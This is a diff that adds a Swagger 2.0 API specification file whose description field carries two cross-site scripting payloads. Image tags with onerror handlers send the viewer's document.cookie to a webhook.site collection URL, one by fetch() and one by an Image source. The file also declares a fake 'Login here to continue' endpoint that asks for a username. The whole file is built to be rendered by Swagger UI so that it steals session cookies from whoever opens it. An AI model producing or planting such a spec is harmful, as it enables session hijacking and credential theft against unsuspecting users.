@@ -1,0 +1,17 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Swagger UI
+  description: '<img src=x onerror="fetch(''https://webhook.site/REPLACE-ME?cookie=''+document.cookie)"> <img src=x onerror="new Image().src=''https://webhook.site/REPLACE-ME?c2=''+document.cookie">'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      parameters:
+        - name: username
+          in: formData
+          required: true
+          type: string
+      responses:
+        '200':
+          description: OK
